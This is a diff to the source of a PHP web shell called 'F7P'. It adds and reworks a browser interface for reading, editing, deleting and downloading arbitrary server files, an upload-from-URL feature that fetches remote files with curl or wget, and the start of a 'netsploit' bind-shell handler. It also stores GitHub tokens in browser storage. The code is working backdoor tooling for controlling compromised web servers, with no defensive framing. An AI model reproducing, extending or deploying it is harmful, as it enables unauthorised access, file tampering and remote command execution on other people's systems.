+echo "<div style='display:flex;gap:8px;flex-wrap:wrap;margin:4px 0;justify-content:center;'>";
+echo "<a href=\"?y=$pwd&amp;edit=$file\" data-no-ajax=\"true\">Edit</a>";
+echo "<a href=\"?y=$pwd&amp;delete=$file\" onclick=\"return confirmDelete('" . addslashes($filn) . "', 'file');\" data-no-ajax=\"true\">Delete</a>";
+echo "<a href=\"?y=$pwd&amp;dl=$file\" data-no-ajax=\"true\">Download</a>";
+echo "<a href=\"?y=$pwd&amp;dlgzip=$file\" data-no-ajax=\"true\">.gz</a>";
+echo "<a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=code\">Code</a>";
+echo "</div>";
+        
+        if(isset($_GET['type']) && ($_GET['type'] == 'code')){
+            echo "<div class=\"viewfile\">";
+            $file_content = @file_get_contents($file);
+            if($file_content !== false) {
+                @highlight_string($file_content);
+            } else {
+                echo "Cannot read file (error: " . error_get_last()['message'] . ")";
+            }
+            echo "</div>";
+        } else {
+            echo "<div class=\"viewfile\">";
+            $content = @file_get_contents($file);
+            if($content !== false) {
+                echo nl2br(htmlentities($content, ENT_QUOTES, 'UTF-8'));
+            } else {
+                echo "Cannot read file (error: " . error_get_last()['message'] . ")";
+            }
+            echo "</div>";
+        }
+    } else {
+        echo "<div style='padding:20px;color:#cc3333;'>File tidak ditemukan: " . htmlspecialchars($file) . "</div>";
+    }
+}
  
 elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){
     $file = isset($_GET['edit']) ? $_GET['edit'] : '';
     
     if(isset($_POST['save'])){
         $file = $_POST['saveas'];
-        
         $content = isset($_POST['content']) ? $_POST['content'] : '';
         if(empty($content) && isset($_POST['content_plain'])) {
             $content = $_POST['content_plain'];
         }
-        
         $timezones = [
             'Asia/Jakarta', 'Asia/Makassar', 'Asia/Jayapura',
             'Asia/Singapore', 'Asia/Bangkok', 'Asia/Ho_Chi_Minh',
@@ -951,22 +1038,16 @@ elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){
             'America/New_York', 'America/Los_Angeles', 'Europe/London',
             'Europe/Paris', 'Australia/Sydney'
         ];
-        
         $user_timezone = isset($_POST['user_timezone']) ? $_POST['user_timezone'] : 'Asia/Jakarta';
-        
         if (!in_array($user_timezone, $timezones)) {
             $user_timezone = 'Asia/Jakarta';
         }
-        
         @date_default_timezone_set($user_timezone);
-        
         $msg = "";
-        
         if($filez = @fopen($file,"w")){
-            $time = date("h:i:s a", time());
+            $time = date("h:i:s A", time());
             if(@fwrite($filez, $content)) {
-                $time = preg_replace('/(\d{2}:\d{2}:\d{2}\s[ap]m)/', '<strong>$1</strong>', $time);
-                $msg = "Saved at " . $time;
+                $msg = "Saved at <strong>" . $time . "</strong>";
             } else {
                 $msg = "Failed to write";
             }
@@ -989,9 +1070,10 @@ elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){
     $display_content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
     $content_base64 = base64_encode($content);
     ?>
-    <form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo urlencode($file); ?>" method="post" id="editForm">
+    <form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo urlencode($file); ?>" method="post" id="editForm" onsubmit="return false;">
         <input type="hidden" name="saveas" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>">
         <textarea class="output" name="content_plain" id="editorContent" style="height:400px;"><?php echo $display_content; ?></textarea>
+        <div id="saveStatus" style="text-align:right;font-size:12px;"></div>
         <?php
         if(isset($msg) && $msg != "") {
             echo "<div style='text-align:right;font-size:12px;'>{$msg}</div>";
@@ -1000,14 +1082,14 @@ elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){
         <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
             <a href="?y=<?php echo $pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/previous.png></a>
             <input class="inputz" id="saveas_input" type="text" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>" style="flex:2;min-width:120px;" readonly />
-            <input class="inputzbut" type="submit" value="Save" name="save" style="flex:1;min-width:70px;" />
+            <input class="inputzbut" type="submit" value="Save" name="save" id="saveBtn" style="flex:1;min-width:70px;" />
         </div>
         
         <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
             <span style="font-size:13px;color:#666;white-space:nowrap;flex-shrink:0;"><img width=24px src=f7p-assets/github.png></span>
             <input class="inputz" id="github_full_path" type="text" style="flex:2;min-width:120px;font-size:13px;font-family:monospace;" 
                    value="Loading..." readonly />
-            <input class="inputzbut" type="button" value="Push to Git" id="pushToGitBtn" onclick="pushToGitHub()" style="flex:1;min-width:70px;background:#2b3137;opacity:0.5;cursor:not-allowed;" disabled />
+            <input class="inputzbut" type="button" value="Push to Git" id="pushToGitBtn" onclick="pushToGitHub()" style="flex:1;min-width:70px;background:#2b3137;opacity:0.5;cursor:not-allowed;" disabled /> 
         </div>
         
         <div class="cmd-row mt-2" style="display:flex;gap:8px;flex-wrap:wrap;">
@@ -1017,66 +1099,222 @@ elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){
         </div>
     </form>
     
-    <script src="f7p-assets/_script_editpage.js"></script>
-        <?php
-    } 
-    elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
-        if(isset($_POST['uploadcomp'])){
-            if(is_uploaded_file($_FILES['file']['tmp_name'])){
-                $path = magicboom($_POST['path']);
-                $fname = $_FILES['file']['name'];
-                $tmp_name = $_FILES['file']['tmp_name'];
-                $pindah = $path.$fname;
-                $stat = @move_uploaded_file($tmp_name,$pindah);
-                if ($stat) {
-                     $msg = "Uploaded to $pindah";
+    <script>
+    (function(){
+        if(window._f7p_edit_initialized) return;
+        window._f7p_edit_initialized = true;
+        
+        var DB_NAME='F7P_EditorDB';var DB_VERSION=1;var STORE_NAME='files';var db=null;
+        var editor=document.getElementById('editorContent');var saveBtn=document.getElementById('saveBtn');
+        var statusDiv=document.getElementById('saveStatus');
+        var filePath='<?php echo addslashes($file); ?>';
+        
+        function openDB(){return new Promise(function(resolve,reject){if(db){resolve(db);return;}var r=indexedDB.open(DB_NAME,DB_VERSION);r.onerror=function(e){reject('IndexedDB error: '+e.target.error);};r.onsuccess=function(e){db=e.target.result;resolve(db);};r.onupgradeneeded=function(e){var d=e.target.result;if(!d.objectStoreNames.contains(STORE_NAME)){d.createObjectStore(STORE_NAME,{keyPath:'path'});}};});}
+        function saveToDB(path,content){return new Promise(function(resolve,reject){openDB().then(function(db){var t=db.transaction([STORE_NAME],'readwrite');var s=t.objectStore(STORE_NAME);var r=s.put({path:path,content:content,timestamp:Date.now()});r.onsuccess=function(){resolve();};r.onerror=function(){reject('Failed to save');};}).catch(reject);});}
+        function getFromDB(path){return new Promise(function(resolve,reject){openDB().then(function(db){var t=db.transaction([STORE_NAME],'readonly');var s=t.objectStore(STORE_NAME);var r=s.get(path);r.onsuccess=function(){resolve(r.result?r.result.content:null);};r.onerror=function(){reject('Failed to read');};}).catch(reject);});}
+        function deleteFromDB(path){return new Promise(function(resolve,reject){openDB().then(function(db){var t=db.transaction([STORE_NAME],'readwrite');var s=t.objectStore(STORE_NAME);var r=s.delete(path);r.onsuccess=function(){resolve();};r.onerror=function(){reject('Failed to delete');};}).catch(reject);});}
+        function uploadFile(filePath,content){return new Promise(function(resolve,reject){var fd=new FormData();var blob=new Blob([content],{type:'application/octet-stream'});var fn=filePath.split('/').pop();fd.append('file_upload',blob,fn);fd.append('file_path',filePath);fd.append('overwrite','1');var xhr=new XMLHttpRequest();xhr.open('POST',window.location.href+'&x=upload_ajax',true);xhr.onload=function(){if(xhr.status===200){try{var resp=JSON.parse(xhr.responseText);if(resp.success){resolve(resp);}else{reject(resp.message||'Upload failed');}}catch(e){reject('Invalid response');}}else{reject('HTTP error: '+xhr.status);}};xhr.onerror=function(){reject('Network error');};xhr.send(fd);});}
+        function saveFileViaIndexedDB(filePath,content){return new Promise(function(resolve,reject){saveToDB(filePath,content).then(function(){return uploadFile(filePath,content);}).then(function(resp){deleteFromDB(filePath).catch(function(){});resolve(resp);}).catch(function(err){reject(err);});});}
+        function restoreFromIndexedDB(filePath){return getFromDB(filePath);}
+        
+        getFromDB(filePath).then(function(content){if(content){editor.value=content;}}).catch(function(){});
+        
+        function updateStatus(msg){
+            if(statusDiv){
+                statusDiv.innerHTML = msg;
+            } else {
+                var div=document.querySelector('#editForm div[style*="text-align:right"]');
+                if(div){div.innerHTML=msg;}
+            }
+        }
+        
+        var saveHandler = function(e){
+            e.preventDefault();
+            var content=editor.value;
+            if(!content&&content!==''){alert('Content is empty');return;}
+            saveBtn.disabled=true;saveBtn.value='Saving...';saveBtn.style.background = 'black';
+saveBtn.style.background = '#CECECE';
+            saveFileViaIndexedDB(filePath,content).then(function(resp){
+                var now=new Date();
+                var h=now.getHours();var m=String(now.getMinutes()).padStart(2,'0');var s=String(now.getSeconds()).padStart(2,'0');
+                var ampm=h>=12?'PM':'AM';h=h%12||12;
+                var timeStr=h+':'+m+':'+s+' '+ampm;
+                var msgHtml='Saved at <strong>'+timeStr+'</strong>';
+                updateStatus(msgHtml);
+                saveBtn.value='Save';saveBtn.disabled=false;saveBtn.style.background = '';
+            }).catch(function(err){
+                alert('Save failed: '+err);
+                saveBtn.value='Save';saveBtn.disabled=false;
+            });
+        };
+        
+        if(saveBtn){
+            saveBtn.removeEventListener('click', saveHandler);
+            saveBtn.addEventListener('click', saveHandler);
+        }
+        
+        document.addEventListener('keydown',function(e){if((e.ctrlKey||e.metaKey)&&e.key==='s'){e.preventDefault();if(document.activeElement===editor||document.activeElement===saveBtn){saveBtn.click();}}});
+        
+        var pasteBtn=document.getElementById('pasteSaveBtn');
+        if(pasteBtn&&editor){
+            pasteBtn.addEventListener('click',function(){
+                if(!navigator.clipboard){alert('Clipboard not available');return;}
+                var btn=this;var orig=btn.value;btn.value='Reading...';btn.disabled=true;
+                navigator.clipboard.readText().then(function(text){
+                    if(text&&text.trim()!==''){
+                        editor.value=text;
+                        btn.value='Pasted';
+                        setTimeout(function(){btn.value=orig;btn.disabled=false;},1500);
+                        saveBtn.click();
+                    }else{alert('Clipboard empty');btn.value=orig;btn.disabled=false;}
+                }).catch(function(err){alert('Failed: '+err.message);btn.value=orig;btn.disabled=false;});
+            });
+        }
+        
+        var copyBtn=document.getElementById('copyContentBtn');
+        if(copyBtn&&editor){
+            copyBtn.addEventListener('click',function(){
+                var btn=this;var orig=btn.value;var content=editor.value;
+                if(!content||content.trim()===''){alert('Nothing to copy');return;}
+                if(!navigator.clipboard){
+                    var ta=document.createElement('textarea');ta.value=content;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);btn.value='Copied';
+                }else{
+                    navigator.clipboard.writeText(content).then(function(){btn.value='Copied';}).catch(function(){alert('Failed to copy');return;});
                 }
-                else $msg = "Failed";
-            }
-            else $msg = "No file";
+                btn.disabled=true;setTimeout(function(){btn.value=orig;btn.disabled=false;},1500);
+            });
         }
-        elseif(isset($_POST['uploadurl'])){
-            $pilihan = trim($_POST['pilihan']);
-            $wurl = trim($_POST['wurl']);
-            $path = magicboom($_POST['path']);
-            $namafile = download($pilihan,$wurl);
-            $pindah = $path.$namafile;
-            if(is_file($pindah)) {
-                $msg = "Downloaded to $pindah";
-            }
-            else $msg = "Failed";
-        }
-    ?>
-        <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post">
-            <table class="tabnet">
-                <tr><th>Upload from Computer</th></tr>
-                <tr><td><input style="color:#222;width:100%;padding:6px;" type="file" name="file" /></td></tr>
-                <tr><td><input class="inputz w-full" type="text" name="path" value="<?php echo $pwd; ?>" /></td></tr>
-                <tr><td><input class="inputzbut" style="width:100%;" type="submit" name="uploadcomp" value="Upload" /></td></tr>
-            </table>
-        </form>
-        <form method="post" action="?y=<?php echo $pwd; ?>&amp;x=upload">
-            <table class="tabnet">
-                <tr><th>Upload from URL</th></tr>
-                <tr><td><input class="inputz w-full" type="text" name="wurl" value="http://example.com/file" /></td></tr>
-                <tr><td><input class="inputz w-full" type="text" name="path" value="<?php echo $pwd; ?>" /></td></tr>
-                <tr><td>
-                    <select class="inputz" style="width:100%;" name="pilihan">
-                        <option value="wwget">wget</option>
-                        <option value="wcurl">curl</option>
-                        <option value="wget">GET</option>
-                        <option value="wlynx">lynx</option>
-                        <option value="wlinks">links</option>
-                        <option value="wfetch">fetch</option>
-                        <option value="wfread">fread</option>
-                    </select>
-                </td></tr>
-                <tr><td><input class="inputzbut" style="width:100%;" type="submit" name="uploadurl" value="Download" /></td></tr>
-            </table>
-        </form>
-        <div style="text-align:center;margin:4px;font-size:14px;"><?php echo $msg; ?></div>
-    <?php
+    
+    })();
+    </script>
+    
+    <script src="f7p-assets/_script_editpage.js"></script>
+    <script src="f7p-assets/_script.js"></script>
+        <?php
     }
+    elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
+    $msg_url = '';
+    $msg_file = '';
+    
+    if(isset($_POST['uploadurl'])){
+        $pilihan = trim($_POST['pilihan']);
+        $wurl = trim($_POST['wurl']);
+        $path = isset($_POST['path']) ? $_POST['path'] : $pwd;
+        if(!empty($path) && substr($path, -1) !== '/' && substr($path, -1) !== '\\'){
+            $path .= DIRECTORY_SEPARATOR;
+        }
+        $namafile = download($pilihan, $wurl);
+        $pindah = $path . $namafile;
+        if(is_file($pindah)) {
+            $msg_url = '✅ Transferred to ' . $pindah;
+        } else {
+            $msg_url = '❌ Failed to transfer';
+        }
+    }
+    
+    if(isset($_POST['uploadcomp'])){
+        if(isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK){
+            $file = $_FILES['file'];
+            $target_dir = isset($_POST['path']) ? $_POST['path'] : $pwd;
+            if(!empty($target_dir) && substr($target_dir, -1) !== '/' && substr($target_dir, -1) !== '\\'){
+                $target_dir .= DIRECTORY_SEPARATOR;
+            }
+            $original_name = basename($file['name']);
+            $dest = $target_dir . $original_name;
+            if(move_uploaded_file($file['tmp_name'], $dest)){
+                $msg_file = '✅ Upload successful! File: ' . htmlspecialchars($original_name);
+            } else {
+                $msg_file = '❌ Failed to save file. Check permissions.';
+            }
+        } else {
+            $msg_file = '❌ No file uploaded or error occurred';
+        }
+    }
+    ?>
+    <div style="max-width:600px;margin:0 auto;padding:10px;">
+        
+        <form method="post" action="?y=<?php echo $pwd; ?>&amp;x=upload" style="background:white;padding:20px;border-radius:12px;margin-bottom:16px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
+            <h3 style="font-size:15px;margin-bottom:12px;">Upload from URL</h3>
+            
+            <?php if ($msg_url): ?>
+                <div style="padding:12px;border-radius:8px;margin-bottom:12px;<?php echo strpos($msg_url, '✅') !== false ? 'background:#d4edda;color:#155724;border:1px solid #c3e6cb;' : 'background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;'; ?>">
+                    <?php echo $msg_url; ?>
+                </div>
+            <?php endif; ?>
+            
+            <div style="margin-bottom:12px;position:relative;">
+                <input class="inputz w-full" type="text" name="wurl" id="urlInput" placeholder="https://example.com/file.zip" style="padding:12px;padding-right:45px;">
+                <span id="urlPasteBtn" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:20px;opacity:0.6;" title="Paste from clipboard">📋</span>
+            </div>
+            <input type="hidden" name="path" value="<?php echo $pwd; ?>">
+            <div style="margin-bottom:12px;">
+                <select class="inputz" style="width:100%;padding:12px;" name="pilihan">
+                    <option value="wcurl">curl (recommended)</option>
+                    <option value="wwget">wget</option>
+                    <option value="wfread">fread</option>
+                </select>
+            </div>
+            <input class="inputzbut" type="submit" name="uploadurl" value="Transfer" style="width:100%;padding:14px;background:#28a745;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;">
+        </form>
+        
+        <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post" style="background:white;padding:20px;border-radius:12px;margin-bottom:16px;box-shadow:0 2px 8px rgba(0,0,0,0.06);">
+            <h3 style="font-size:15px;margin-bottom:12px;">Upload from Computer</h3>
+            
+            <?php if ($msg_file): ?>
+                <div style="padding:12px;border-radius:8px;margin-bottom:12px;<?php echo strpos($msg_file, '✅') !== false ? 'background:#d4edda;color:#155724;border:1px solid #c3e6cb;' : 'background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;'; ?>">
+                    <?php echo $msg_file; ?>
+                </div>
+            <?php endif; ?>
+            
+            <div style="margin-bottom:12px;">
+                <input type="file" name="file" style="width:100%;padding:12px;border:2px dashed #ccc;border-radius:8px;background:#fafafa;font-size:14px;cursor:pointer;" required>
+            </div>
+            <input type="hidden" name="path" value="<?php echo $pwd; ?>">
+            <input class="inputzbut" type="submit" name="uploadcomp" value="Upload" style="width:100%;padding:14px;background:#0066cc;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;">
+        </form>
+    </div>
+    
+    <script>
+    (function(){
+        var urlPasteBtn = document.getElementById('urlPasteBtn');
+        var urlInput = document.getElementById('urlInput');
+        
+        if (urlPasteBtn && urlInput) {
+            urlPasteBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (!navigator.clipboard) {
+                    alert('Clipboard not available');
+                    return;
+                }
+                var btn = this;
+                var origText = btn.textContent;
+                btn.textContent = '⏳';
+                navigator.clipboard.readText().then(function(text) {
+                    if (text && text.trim() !== '') {
+                        urlInput.value = text.trim();
+                        urlInput.dispatchEvent(new Event('input'));
+                        btn.textContent = '✅';
+                        setTimeout(function() {
+                            btn.textContent = origText;
+                        }, 1500);
+                    } else {
+                        btn.textContent = '❌';
+                        setTimeout(function() {
+                            btn.textContent = origText;
+                        }, 1500);
+                    }
+                }).catch(function() {
+                    btn.textContent = '❌';
+                    setTimeout(function() {
+                        btn.textContent = origText;
+                    }, 1500);
+                });
+            });
+        }
+    })();
+    </script>
+    <?php
+}
     elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit')){
         if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
             $port = trim($_POST['port']);
@@ -1303,11 +1541,9 @@ elseif(isset($_GET['x']) && ($_GET['x'] == 'github')){
         </form>
         
         <script>
-       
         function toggleMultiDir(isMulti) {
             var singleRow = document.getElementById('singleDirRow');
             var multiRow = document.getElementById('multiDirRow');
-            
             if (singleRow && multiRow) {
                 if (isMulti) {
                     singleRow.style.display = 'none';
@@ -1318,8 +1554,6 @@ elseif(isset($_GET['x']) && ($_GET['x'] == 'github')){
                 }
             }
         }
-        
-       
         document.addEventListener('DOMContentLoaded', function() {
             var token = localStorage.getItem('f7p_gh_token_9x7k2m');
             var repo = localStorage.getItem('f7p_gh_repo_9x7k2m');
@@ -1329,7 +1563,6 @@ elseif(isset($_GET['x']) && ($_GET['x'] == 'github')){
             var dirMode = localStorage.getItem('f7p_dir_mode_9x7k2m');
             var frontendPath = localStorage.getItem('f7p_frontend_path_9x7k2m');
             var backendPath = localStorage.getItem('f7p_backend_path_9x7k2m');
-            
             if (token) document.getElementById('github_token').value = token;
             if (repo) document.getElementById('github_repo').value = repo;
             if (branch) document.getElementById('github_branch').value = branch;
@@ -1337,7 +1570,6 @@ elseif(isset($_GET['x']) && ($_GET['x'] == 'github')){
             if (githubPath) document.getElementById('github_path').value = githubPath;
             if (frontendPath) document.getElementById('frontend_path').value = frontendPath;
             if (backendPath) document.getElementById('backend_path').value = backendPath;
-            
             if (dirMode === 'multi') {
                 document.querySelector('input[name="dir_mode"][value="multi"]').checked = true;
                 toggleMultiDir(true);
@@ -1385,5 +1617,11 @@ elseif(isset($_GET['x']) && ($_GET['x'] == 'github')){
     };
 </script>
 <script src="f7p-assets/_bookmark.js"></script>
+<script class="proprietary">
+// F7P - File 7ransfer Protocol
+// core1: Aditya Kesuma, 2014
+// core2: paxi@yahoo.com
+// icons: Michal Bačík, Google Images
+</script>
 </body>
 </html>
